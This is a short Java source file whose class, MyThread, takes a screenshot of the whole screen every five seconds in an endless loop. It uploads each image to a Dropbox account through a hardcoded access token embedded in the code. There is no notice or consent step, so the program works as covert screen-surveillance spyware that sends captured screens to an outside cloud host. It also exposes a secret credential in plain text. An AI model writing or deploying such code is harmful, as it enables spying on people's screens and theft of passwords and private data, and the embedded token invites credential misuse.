import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import static java.lang.Thread.sleep;

public class MyThread {
    public void run() throws IOException, AWTException {

        String ACCESS_TOKEN = "sIYYYTnHPZAAAAAAAAAADjfOtCXxhuwHnk_bXEUaAsEHRbgjZ6Z6PGn_eKjeKdcE";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        Robot robot = new Robot();
        DateFormat date = new SimpleDateFormat("yyyyMMdd_HHmmss");

        for ( ; ; ) {

            try {
            BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            ImageIO.write(screenShot, "jpg", output);
            ByteArrayInputStream input = new ByteArrayInputStream(output.toByteArray());

                FileMetadata metadata = client.files()
                        .uploadBuilder("/" + date.format(new Date())+".jpg")
                        .uploadAndFinish(input);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            try {
                sleep(5000);
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
